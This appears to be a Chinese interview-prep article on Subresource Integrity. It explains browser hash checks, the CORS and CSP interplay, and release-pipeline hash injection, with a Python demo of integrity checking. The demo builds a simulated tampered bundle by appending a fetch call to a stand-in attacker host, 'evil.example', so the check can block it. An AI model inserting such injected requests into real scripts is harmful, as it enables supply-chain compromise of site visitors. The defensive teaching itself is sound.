---
title: "[Q6220] 子资源完整性 SRI：CDN 篡改防线与完整性校验流程"
date: 2026-11-24
categories: [PythonWeb后端]
tags: [Python面试, 面试题, 27]
type: 面试题
---

### Q6220 · 子资源完整性 SRI：integrity 哈希、CDN 篡改防线与发版联动

难度：P6 ｜ 标签：SRI、Subresource Integrity、CSP、CDN 安全、integrity 属性、哈希校验

**问**：`<script src="https://cdn.example/app.js" integrity="sha384-..." crossorigin="anonymous">` 里的 integrity 在校验什么、由谁校验？CDN 或代理被篡改注入恶意代码时，SRI 怎么把它拦下来？SRI 能保护同源脚本吗——为什么多数站点同源脚本没加？发版时哈希怎么同步，改了 JS 忘更新 integrity 会发生什么？

**答**：
结论：SRI（Subresource Integrity，W3C）由**浏览器**在加载外部资源时校验：下载完成后按 integrity 属性声明的算法（sha256/384/512，前缀标注）计算内容摘要，与属性值比对，不匹配则**拒绝执行并报网络错误**——资源在 CDN、代理、任何中间环节被篡改（供应链攻击）都会在客户端被拦截。作用范围：`<script>`、`<link rel=stylesheet>` 等带 src/href 的外部资源；**只对跨源资源强制有意义**——同源资源本身受同源策略与你的服务器安全控制，SRI 增益小（但加了也不冲突，只是维护成本高）。发版联动：integrity 值必须由**构建流水线**在产出资源文件时自动生成并注入 HTML（手工维护必忘必错）；改了 JS 而 integrity 未更新 → 全量用户加载失败（资源被浏览器拒执行）→ 白屏级事故。配套：`crossorigin="anonymous"` 决定 CORS 模式，CDN 必须回 `Access-Control-Allow-Origin`，否则校验请求被 CORS 拦截——SRI 与 CORS 是绑定的，漏配 crossorigin 是 SRI 上线第一天最常见的故障。

取舍：a) 保护面排序：第三方 CDN（不可控链路）> 自有 CDN（半可控）> 同源（本机控制）——SRI 优先给不可控链路；b) 动态 import/模块加载器（webpack runtime）要支持 integrity 或经 CSP 兜底——构建链不支持时 SRI 只能覆盖静态引用的入口资源；c) CSP 是另一道独立防线（`script-src` 限制来源，Q1367），SRI 管"内容没被改"，CSP 管"来源是否可信"——互补不是替代；d) 多哈希并配：`integrity="sha512-x sha384-y"` 浏览器取最强可用算法匹配，跨实现兼容友好；e) 灰度策略：SRI 值错误 = 全量拒载，先在灰度环境跑通再全量，错误监控里"资源加载失败率"是上线观察指标。

实战：事故形态是"安全扫描发现某第三方 JS 库 CDN 出口被注入挖矿代码，站点直接引了该 CDN——上 SRI：入口资源哈希进构建产物，第三方库锁定版本自托管 + SRI 双保险；上线时因 crossorigin 未配导致资源全挂，补 CDN 的 ACAO 头后恢复"。下面实现完整性校验流程。

```python
import base64
import hashlib


def integrity_value(content: bytes, algo: str = "sha384") -> str:
    digest = hashlib.new(algo, content).digest()
    return f"{algo}-{base64.b64encode(digest).decode()}"


bundle = b"function app(){return 42}"
tag = integrity_value(bundle)
print("[1] 构建期生成的 integrity:", tag)

# 浏览器视角: 下载内容 -> 计算摘要 -> 与 integrity 比对
def browser_load(downloaded: bytes, expected: str) -> str:
    algo = expected.split("-", 1)[0]
    actual = integrity_value(downloaded, algo)
    if actual != expected:
        return "blocked: integrity mismatch (refuse to execute)"
    return "executed"


print("[2] 正常 CDN 内容:", browser_load(bundle, tag))
tampered = bundle + b";fetch('//evil.example/x')"
print("[3] CDN 被注入:", browser_load(tampered, tag))

multi = f"sha512-{base64.b64encode(hashlib.sha512(bundle).digest()).decode()} {tag}"
print("[4] 多哈希并配:", multi[:40], "... -> 取最强可用算法匹配")

print("[5] 发版纪律: integrity 由构建注入, JS 内容变更必须同步更新, 否则全量拒载")
print("[6] crossorigin=anonymous + CDN 的 ACAO 头是 SRI 的前置条件, 漏配即全挂")
```

**追问一**：SRI 与 CSP 的分工边界是什么？为什么两者都要？—— SRI 校验**内容完整性**（"这个文件是我发布的那份"），对"来源被劫持但内容恰好与我声明的哈希一致"无意义——它只认内容指纹；CSP 的 `script-src` 校验**来源合法性**（"只允许从这些源加载脚本"），对"可信源被篡改"无能为力——来源可信不等于内容未被篡改。攻击矩阵里两者各挡一格：不可信源注入（CSP 挡）、可信源被篡改（SRI 挡）、内联注入（CSP nonce，Q1367/Q6157 挡）。只上 SRI 不配 CSP，攻击者换一个未列入白名单的源就能绕过；只配 CSP 不上 SRI，自家 CDN 被黑即全沦陷。

**追问二**：发版流程里 SRI 哈希的生命周期怎么管理？—— 正确链路：构建产出资源文件 → 同一构建计算哈希 → 注入到 HTML/模板/manifest → 整体发布（HTML 引用的 integrity 与实际资源必须出自同一次构建产物）。危险链路：HTML 与资源分开构建、手工维护哈希、HTML 先发资源后发（引用了尚不存在的哈希值）。防御设计：构建产物的原子发布（HTML 与资源同版本），SRI 校验进 CI（用产物回放校验），资源加载失败率监控作为发布门禁——SRI 值不匹配的表现就是"资源加载失败"，这个指标天然是 SRI 的健康探针。

## 背诵要点
- SRI 由浏览器校验外部资源内容摘要（sha256/384/512 + base64），不匹配拒绝执行——CDN/代理篡改的客户端防线。
- 只对跨源资源有意义；前置条件 crossorigin=anonymous + CDN 的 ACAO 头，漏配即全量拒载。
- SRI 管内容完整性、CSP 管来源与内联，互补不可替代；integrity 必须构建期自动注入，发版同产物原子发布。

## 复盘追问
- 第三方 CDN 出口被注入挖矿代码，怎么防？（SRI 哈希校验 + 自托管锁版本 + CSP script-src 兜底）
- 上 SRI 后资源全挂，最可能漏配了什么？（crossorigin 与 CDN 的 Access-Control-Allow-Origin；构建期哈希注入与原子发布）
